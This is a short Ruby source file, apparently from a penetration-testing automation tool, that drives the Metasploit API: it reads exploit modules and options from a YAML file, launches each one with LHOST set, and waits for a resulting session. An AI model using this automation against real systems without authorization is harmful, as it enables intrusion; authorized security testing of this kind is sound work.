require_relative '../global/setting'
require_relative './tool/msf'

def attack_module(host, config_file_path)
  # Metasploit APIと接続
  msf_api = MetasploitAPI.new(host)
  msf_api.auth_login_module
  msf_api.console_create_module

  #yamlファイルを読み込む
  msf_module_config = YAML.load_file("./#{config_file_path}")
  msf_modules = msf_module_config['metasploit_module']

  puts "#{$execute_symbol} exploit attack"

  msf_modules.each do |msf_module|
    msf_module_type = msf_module['module_type']
    msf_module_name = msf_module['module_name']

    options = msf_module['options']
    msf_module_option = {}
    options.each do |option|
      msf_module_option[option['name']] = option['var']
    end
    msf_module_option['LHOST'] = host

    msf_module_info = msf_api.module_execute_module(msf_module_type, msf_module_name, msf_module_option)

    i = 0
    session_connection_flag = false

    module_spinner = TTY::Spinner.new("#{$parenthesis_symbol}:spinner#{$parenthesis_end_symbol} #{msf_module['module_name']}", success_mark: "#{$success_symbol}", error_mark: "#{$error_symbol}")
    module_spinner.auto_spin
    loop do
      sleep(1)
      msf_session_list = msf_api.module_session_list
      msf_session_list.each do |session_info_key, session_info_value|
        if msf_module_info['uuid'] == session_info_value['exploit_uuid'] then
          session_connection_flag = true
          break
        end
      end
      break if i > 1200 || session_connection_flag
      i += 1
    end

    if session_connection_flag then
      module_spinner.success
    else
      module_spinner.error
    end
  end

end

